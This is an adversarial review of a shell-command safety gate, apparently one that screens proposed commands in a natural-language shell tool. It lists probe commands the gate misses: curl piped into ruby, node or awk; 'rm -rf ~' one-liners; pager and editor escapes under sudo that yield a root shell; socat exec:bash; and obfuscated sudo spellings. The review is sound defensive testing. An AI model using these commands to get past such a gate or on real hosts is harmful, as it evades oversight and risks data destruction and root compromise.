# Adversarial review — gate-command-table-engine (issue_204)

I re-ran the probes myself against `$PDCA_TARGET/src` with the harness venv
(`/home/eddie/nl-shell/nl-shell-pdca/.venv/bin/python3`). Every probe went through the
public `nl_shell.gate.classify(cmd, origin=...)`.

## The evidence (C4 red→green)

- Attempted to refute; could not. `gate-logs/C4-verify.log:17` shows the green leg at
  391 passed. `:6690` shows the red leg at 144 failed, 236 passed, 11 errors. The 236
  passes are mostly `tests/test_policy_gate.py` / `tests/test_targets.py`, which C4 also
  runs (`:10`), plus the floor group, which the brief allows to pass on the stub. Every
  non-floor `tests/test_gate_commands.py` group goes red on the stub: either an
  `ImportError` on the new `nl_shell.gate.commands` (fixture at
  `tests/test_gate_commands.py:98`, imported inside the function as the brief requires)
  or a wrong class. The tests call production `classify`, not a copy. The "144 of 380"
  in `check-gates.json` counts all three files, so it overstates how much of the bundle
  test went red. That is cosmetic, not a refutation.
- Harvester drift check (the brief makes this a human/reviewer job): I re-ran
  `scripts/harvest_inventory.py --output ./inv-rerun.toml` on this host
  (`VERSION="26.04.1 LTS (Resolute Raccoon)"`). It matches the checked-in
  `targets/ubuntu-26.04/inventory.toml` byte for byte. No drift.

## The fix — inputs that break it

- NEEDS-HUMAN [impl] — Class 1 coverage misses interpreters that are installed on the
  reference host: `ruby` (`/usr/bin/ruby` → `ruby3.3`, dpkg section `ruby`), `node`
  (`nodejs`, section `javascript`) and `awk` (→ `/usr/bin/mawk`, section `utils`). The
  harvester only takes packages in sections `("shells", "interpreters")`
  (`scripts/harvest_inventory.py:46`, documented at `:11-13`), so these never reach the
  inventory, and `commands.toml` has no row for them. Concrete failing cases, run on the
  patched tree: `curl x | ruby`, `curl x | node`, `curl x | awk -f /dev/stdin`,
  `ruby -e 'system "rm -rf ~"'` and `awk 'BEGIN{system("rm -rf ~")}'` all come out
  `mutating`, "not allowlisted". Their twin `curl x | python3`
  (`tests/test_gate_commands.py:169`) comes out `destructive`, "runs code the gate cannot
  read". The proposals `sudo ruby`, `sudo node` and `sudo awk 'BEGIN{system("sh")}'` are
  `privileged` but **not rejected**, while `sudo python3` / `sudo perl` / `sudo tclsh`
  are rejected. That breaks the spec's own class-1 claim (`docs/design/specs/policy-gate/v1.md:177-182`,
  "Every binary on the target that … runs … an interpreter, has a row") and the
  "elevation reaches inner commands" decision for these names. The coverage test
  (`tests/test_gate_commands.py:131`) cannot catch it, because it only checks names that
  are already in the inventory. Fix: add rows for `ruby*`, `node`/`nodejs`, `awk`/`mawk`
  (and widen the harvester's name patterns or sections so they land in the inventory),
  plus a regression case for each.
- NEEDS-HUMAN [human] — Commands that can drop to a shell from inside (pagers, editors,
  `login`, `socat`) have no row, so they are not rejected under elevation. Proposals
  `sudo less /etc/shadow`, `sudo more …`, `sudo man ls`, `sudo git log`,
  `sudo journalctl` (each opens a pager where `!sh` gives a root shell), `sudo vi`,
  `sudo nano`, `sudo ed`, `sudo login` and `sudo socat - exec:bash` all come out
  `privileged`, `rejected=False`. Under the brief's harvester rules, class 1 does not
  require rows for these, so this is not a defect against the brief as written. A human
  should decide whether "runs a shell" in class 1 should cover shell escapes like these,
  or whether this goes into the written gap list next to class 7.
- Attempted to refute and could not: ANSI-C lookup (`$'\163udo' -i`,
  `$'\U00000073udo' -i`, `$'s'udo -i`, `s$'u'do -i`, `$'\x2fusr/bin/sudo' -i`,
  `$'sudo\0x' -i`, `foo $'sudo\0x'`, `sudo $'-\x53' true`, `sudo -$'S' true` are all
  caught). `$'\cSudo'` decodes to a control-S word, not `sudo`, so `mutating` is
  correct. Sudo option grammar (`-iS`, `-Si`, `-nS`, `--stdin`, `--prompt=x`,
  `--askpass`, `-uroot -i`, `--user=root -i`, `-ii`, `--login`, unknown `--stdi` →
  rejected as a proposal). Wrappers with value options before an inner `sudo -i`
  (`env -u X`, `env --unset=X`, `env -C /`, `nice -n 5 --`, `timeout --signal=9`,
  `timeout -k 1 5`, `time -p`, `stdbuf -i0 -o0`, `setsid -w`, `watch -x`, every `xargs`
  value option I tried, `find -exec/-execdir/-ok/-okdir`). Elevation reaching inner
  commands through unknown or extra wrappers (`sudo foo bash`, `sudo ltrace bash`,
  `sudo nsenter -t 1 -a`, `sudo ip netns exec x bash`, `sudo setarch x86_64 bash`,
  `sudo prlimit bash`, `sudo capsh --`, `sudo -u#0 bash`, `sudo b\ash`, `sudo "ba"sh`).
  Pipes and here-strings into `su` / `doas` / `pkexec`. Decision C fails closed
  (`src/nl_shell/gate/__init__.py:153-157`). The loader's `functools.cache`
  (`src/nl_shell/gate/commands.py:295`) does not cache a raised `CommandsError`, so a
  broken table cannot be "fixed" by a later cached success.
- Not filed (within the brief's stated gaps): `flock -c 'sudo -i' /tmp/l` and
  `env -S'sudo -i'` are only `destructive`, not rejected, as proposals. That is decision
  B as the brief requires for this child, and child-2 owns it. `foo --opt=sudo` and
  `foo -esudo` stay `mutating`, because decision A does not split words (an accepted
  gap). `sudo -- -i` / `sudo -- -S true` are not rejected, but they run a command
  literally named `-i` / `-S`, which does nothing.

## The verdict

- NEEDS-HUMAN [impl] — The only unwarranted claim is the class-1 coverage claim as the
  spec states it (`docs/design/specs/policy-gate/v1.md:177-178`) and as the green
  coverage test implies. "Every binary … that runs … an interpreter, has a row" is false
  on the reference host (ruby, node, awk; see the first bullet). The test is green only
  because the inventory and the rows share the same blind spot. Either add the rows or
  narrow the spec sentence to what the harvester actually collects.

<!-- pdca:leaf-complete -->
